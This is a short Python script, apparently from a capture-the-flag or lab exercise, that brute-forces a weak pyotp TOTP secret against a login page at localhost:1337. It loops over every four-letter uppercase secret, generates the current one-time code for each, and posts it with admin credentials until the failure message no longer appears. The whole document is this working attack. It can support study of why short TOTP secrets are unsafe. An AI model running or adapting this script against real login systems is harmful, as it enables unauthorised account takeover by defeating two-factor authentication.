import pyotp
import itertools
import requests 


def generate_otp(secret):
    totp = pyotp.TOTP(secret)
    current_otp = totp.now()
    return current_otp

def example():
    """
    Example bruteforce of pyotp secret in a login page
    """
    url = "http://localhost:1337/login"
    data = {
        "username": "admin",
        "password": "password",
        "totp" : ""
    }
    wordlist = [''.join(chars) for chars in itertools.product('ABCDEFGHIJKLMNOPQRSTUVWXYZ', repeat=4)]
    for secret in wordlist:
        otp = generate_otp(secret)
        data["totp"] = otp
        print(f"\rTrying secret: {secret} Data: {data}", end='', flush=True)
        r = requests.post(url, data=data)
        if "2FA code is incorrect" not in r.text:
            print(r.text)
            print(f"Secret: {secret}")
            print(f"OTP: {otp}")
